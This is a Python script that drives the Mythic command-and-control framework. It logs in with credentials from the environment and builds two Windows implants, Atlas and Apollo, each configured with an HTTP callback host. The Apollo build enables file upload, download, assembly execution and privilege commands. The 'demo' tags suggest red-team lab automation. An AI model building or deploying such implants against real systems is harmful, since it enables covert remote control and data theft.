from mythic import mythic_rest
from sys import exit
import asyncio
import os
import time

async def scripting():
    mythic = mythic_rest.Mythic(
        username=os.getenv("MYTHICUSER"),
        password=os.getenv("MYTHICPASS"),
        server_ip=os.getenv("MYTHICIP"),
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()

    print("[+] Creating Atlas Payload")
    p = mythic_rest.Payload(
        payload_type="atlas", 
        c2_profiles={
            "http":[
                    {"name": "callback_host", "value": os.getenv("STAGEONE")},
                    {"name": "callback_interval", "value": 10}
                ]
            },
        build_parameters=[
            {
                "name": "version", "value": 4.0
            },
            {
                "name": "arch", "value": "x64"
            },
            {
                "name": "output_type", "value": "WinExe"
            }
        ],
        tag="Mythic Demo Stage 1",
        selected_os="Windows",
        filename="atlas-stage1.exe")
    resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
    print("[+] Downloading Atlas Payload")
    payload_contents = await mythic.download_payload(resp.response)
    print("[+] Writing Atlas Payload")
    payload_file = open("../payloads/atlas-stage1.exe", "wb")
    payload_file.write(payload_contents)

    print("[+] Creating Apollo Payload")
    p = mythic_rest.Payload(
        payload_type="apollo", 
        c2_profiles={
            "http":[
                    {"name": "callback_host", "value": os.getenv("STAGETWO")},
                    {"name": "callback_interval", "value": 10}
                ]
            },
        build_parameters=[
            {
                "name": "version", "value": 4.0
            },
            {
                "name": "configuration", "value": "Release"
            },
            {
                "name": "output_type", "value": "WinExe"
            }
        ],
        commands=["download", "execute_assembly", "exit", "getprivs", "jobkill", "jobs", "kill", "list_assemblies", "ls", "mv", "ps", "ps_full", "pwd", "register_assembly", "sleep", "unload_assembly", "upload", "whoami"],
        tag="Mythic Demo Stage 2",
        selected_os="Windows",
        filename="apollo-stage2.exe")
    resp = await mythic.create_payload(p, all_commands=False, wait_for_build=True)
    print("[+] Downloading Apollo Payload")
    payload_contents = await mythic.download_payload(resp.response)
    print("[+] Writing Apollo Payload")
    payload_file = open("../payloads/apollo-stage2.exe", "wb")
    payload_file.write(payload_contents)
    exit(0)
    
async def main():
    await scripting()
    try:
        while True:
            pending = asyncio.all_tasks()
            if len(pending) == 0:
                exit(0)
            else:
                await asyncio.gather(*pending)
    except KeyboardInterrupt:
        pending = asyncio.all_tasks()
        for t in pending:
            t.cancel()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
